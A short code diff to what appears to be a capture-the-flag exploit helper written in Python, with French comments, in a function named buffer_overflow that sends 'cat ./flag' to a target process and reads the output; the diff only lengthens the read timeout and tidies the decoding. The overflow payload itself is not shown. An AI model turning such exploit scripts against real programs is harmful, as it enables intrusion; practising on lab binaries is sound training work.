@@ -17,8 +17,8 @@ def buffer_overflow(binary_path: str, offset: int, win_addr: int) -> str:
     io.recvline()
     # Lis le flag et affiche la sortie
     io.sendline(b"cat ./flag")
-    flag = io.recvall(timeout=0.1)
-    return flag.decode().strip()
+    flag = io.recvall(timeout=1).decode().strip()
+    return flag
 
 
 if __name__ == "__main__":
